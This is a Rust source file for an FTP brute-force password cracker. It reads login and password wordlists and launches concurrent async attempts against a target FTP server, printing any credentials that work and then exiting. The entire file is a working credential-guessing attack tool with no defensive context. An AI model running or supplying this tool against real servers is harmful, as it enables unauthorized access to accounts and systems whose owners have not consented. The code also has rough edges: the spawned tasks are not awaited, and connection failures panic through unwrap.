use anyhow::{Error, Ok};
use core::result::Result::Ok as Okb;
// use rayon::prelude::*;
use std::env;
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::process;
use std::str;
use suppaftp::FtpStream;

mod error;

#[tokio::main]
async fn main() -> Result<(), Error> {
    let args: Vec<String> = env::args().collect();
    check_arguments(&args)?;
    cracker(&args[1], &args[2], &args[3]).await;
    Ok(())
}

fn check_arguments(args: &Vec<String>) -> Result<(), Error> {
    if args.len() == 4 {
        return Ok(());
    }
    Err(error::CrackerError::WrongArguments.into())
}

async fn cracker(logins: &str, passwords: &str, target: &str) {
    let (logins, passwords) = parse_files(logins, passwords).unwrap();
    for login in &logins {
        let login = login.clone();
        let target = target.to_string();
        let passwords = passwords.clone();

        tokio::spawn(async move {
            let login_clone = login.clone();
            let password_clone = passwords.clone();
            let target_clone = target.to_string();

            for password in &password_clone {
                let login_clone = login_clone.clone();
                let password_clone = password.clone();
                let target_clone = target_clone.to_string();
                tokio::spawn(async move {
                    caller(&login_clone, &password_clone, &target_clone).await;
                });
            }
        });
    }
}

async fn caller(login: &str, password: &str, target: &str) {
    println!("       {}:{} - {}", login, password, target);
    let mut ftp_stream = FtpStream::connect(target).unwrap();
    match ftp_stream.login(login, password) {
        Err(_) => {}
        Okb(_) => {
            println!("found: {}:{}", login, password);
            let _ = ftp_stream.quit();
            process::exit(0x0100);
        }
    };
}

fn parse_files(logins: &str, passwords: &str) -> Result<(Vec<String>, Vec<String>), Error> {
    let file_logins = File::open(logins)?;
    let reader_logins = BufReader::new(&file_logins);
    let file_passwords = File::open(&passwords)?;
    let reader_passwords = BufReader::new(&file_passwords);
    let logins: Vec<String> = reader_logins
        .lines()
        .map(|line| line.expect("Failed to read line"))
        .collect();
    let passwords: Vec<String> = reader_passwords
        .lines()
        .map(|line| line.expect("Failed to read line"))
        .collect();
    Ok((logins, passwords))
}
